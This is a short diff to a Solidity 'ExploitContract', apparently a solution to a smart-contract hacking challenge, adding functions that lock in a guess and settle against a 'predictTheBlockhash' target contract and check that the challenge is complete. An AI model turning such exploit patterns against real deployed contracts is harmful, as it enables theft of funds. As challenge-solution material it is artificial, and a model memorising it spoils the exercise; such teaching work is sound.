@@ -53,4 +53,14 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+    function callLockInGuess(bytes32 hash) public payable{
+        predictTheBlockhash.lockInGuess{value: msg.value}(hash);
+    }
+
+    function callSettle() public {
+        predictTheBlockhash.settle();
+        require(predictTheBlockhash.isComplete(), "failed to settle");
+    }
+
+    receive() external payable {}
 }
